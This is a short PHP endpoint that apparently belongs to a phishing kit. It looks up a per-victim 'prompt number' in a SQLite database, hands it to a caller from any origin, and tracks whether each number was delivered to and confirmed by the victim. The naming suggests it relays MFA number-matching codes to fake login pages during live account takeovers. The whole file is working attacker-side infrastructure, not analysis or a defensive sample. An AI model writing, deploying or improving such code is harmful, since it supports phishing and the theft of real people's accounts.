<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

define('DB_FILE', '../storage/box26.db');

$victim_id = $_GET['victim_id'] ?? '';
$confirm = $_GET['confirm'] ?? '';

// ===== CONFIRM =====
if ($confirm) {
    try {
        $db = new PDO('sqlite:' . DB_FILE);
        $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $db->prepare("UPDATE prompt_numbers SET status = 'confirmed', confirmed_at = CURRENT_TIMESTAMP WHERE victim_id = ? AND status = 'delivered'");
        $stmt->execute([$confirm]);
        echo json_encode(['success' => true]);
        exit;
    } catch(Exception $e) {
        echo json_encode(['error' => $e->getMessage()]);
        exit;
    }
}

// ===== GET NUMBER =====
if (!$victim_id) {
    echo json_encode(['number' => null, 'error' => 'No victim ID']);
    exit;
}

try {
    if (!file_exists(DB_FILE)) {
        echo json_encode(['number' => null, 'error' => 'DB not found']);
        exit;
    }
    
    $db = new PDO('sqlite:' . DB_FILE);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    $stmt = $db->prepare("SELECT number FROM prompt_numbers WHERE victim_id = ? AND status = 'waiting' ORDER BY created_at DESC LIMIT 1");
    $stmt->execute([$victim_id]);
    $result = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if ($result) {
        $update = $db->prepare("UPDATE prompt_numbers SET status = 'delivered', delivered_at = CURRENT_TIMESTAMP WHERE victim_id = ? AND number = ?");
        $update->execute([$victim_id, $result['number']]);
        echo json_encode(['number' => $result['number'], 'success' => true]);
    } else {
        echo json_encode(['number' => null, 'success' => false]);
    }
} catch (Exception $e) {
    echo json_encode(['number' => null, 'error' => $e->getMessage()]);
}
?>
